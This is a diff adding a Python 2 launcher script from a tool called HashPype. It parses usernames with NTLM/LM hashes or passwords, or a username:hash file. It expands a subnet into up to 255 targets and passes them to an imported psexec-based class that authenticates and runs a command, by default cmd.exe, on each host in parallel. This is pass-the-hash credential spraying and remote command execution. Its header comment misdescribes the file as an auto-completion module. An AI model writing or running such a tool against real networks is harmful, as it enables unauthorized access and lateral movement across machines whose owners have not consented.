@@ -1,0 +1,97 @@
+#!/usr/bin/env python
+# This file is part of the HashPype Suite.
+#
+#    HashPype is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    HashPype is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with HashPype.  If not, see <http://www.gnu.org/licenses/>.
+#
+# Completer handles the auto-completion features for HashPype
+import psexec
+import sys
+import threading
+import Queue
+from time import sleep
+import random
+import optparse
+from core.hashpypethread import *
+from core.hashpypeclass import *
+
+# Initialize Argument Parser and Argument values
+parser = optparse.OptionParser("\n" + sys.argv[0] + " -U [username] -H [hash] -S [subnet]\n" + sys.argv[0] + " -L creds.txt -C ipconfig -R 15 -T 192.168.1.108")
+
+parser.add_option("-H", "--hashes", dest="hashes", default=None, type="string", help="The NTLM and LM Hashes")
+parser.add_option("-W", "--password", dest="password", default=None, type="string", help="Password to authenticate with used alternatively to hashes")
+parser.add_option("-U", "--username", dest="username", default=None, type="string", help="The username to authenticate with")
+parser.add_option("-S", "--subnet", dest="subnet", default=None, type="string", help="The subnet to scan in format x.x.x")
+parser.add_option("-T", "--target", dest="target", default=None, type="string", help="Used alternatively to subnet to target a single machine")
+parser.add_option("-C", "--command", dest="command", default="cmd.exe", type="string", help="The Command to execute once authed.")
+parser.add_option("-P", "--path", dest="path", default="c:\\windows\\system32\\", type="string", help="The path to execute the command in")
+parser.add_option("-L", "--credentials", dest="credentials", default=None, type="string", help="Used alternatively to username/hashes, include a text file with a list of username:hash sets one per line")
+parser.add_option("-R", "--threads", dest="threads", default=30, type="int", help="Specify the number of threads to run")
+parser.add_option("-V", "--verbose", dest="verbose", default=0, type="int", help="Specify the verbosity of the scripts output")
+
+(options, args) = parser.parse_args()
+
+credentials = []
+
+# Determine if there is a single username or a list of credentials
+if options.username != None:
+	# Determine if a password or a hash is being used
+	if options.password != None:
+		credentials.append((options.username,options.password))
+	elif options.hashes != None:
+		credentials.append((options.username,options.hashes))
+	else:
+		print "You dun g00fed son, enter either a password or hash with the username"
+		sys.exit()
+
+# Handle Input file with credentials
+elif options.credentials != None:
+	# Open Credential List and place each row into an array
+	credlist = open(options.credentials, 'r').read().split("\n")
+
+	for item in credlist:
+		pew = item.split(":")
+		# If there are 3 sections we assume username:hash1:hash2 and recombine hash1:hash2 into a single element
+		if len(item.split(":")) == 3:
+			pew[1] = ':'.join(pew[1:])
+		# Populate Credentials List
+		credentials.append([pew[0], pew[1]])
+	
+else:
+	print "You dun g00fed son, read the help screen you need authentication creds =/"
+	sys.exit()
+
+attack = []
+# Determine if a single host is targetted or a subnet and generate a list accordingly
+if options.subnet != None:
+	for i in range(1, 256):
+		ip = "%s.%s" % (options.subnet, i)
+		attack.append(ip)
+elif options.target != None:
+	attack.append(options.target)
+else:
+	print "You dun g00fed son, enter a proper subnet or host address to target"
+	sys.exit()	
+
+threadcount = options.threads # Set the number of threads to run
+command = options.command # Set the command for psexec to execute on a successful authentication
+path = options.path # Set the path for psexec to execute the command in
+verbose = options.verbose # Set the verbosity level of script output
+def main():
+
+	# Spark a bowl
+	hp = hashpype(credentials, attack, command, path, threadcount, verbose)
+	hp.run()
+	
+if __name__ == '__main__':
+	main()
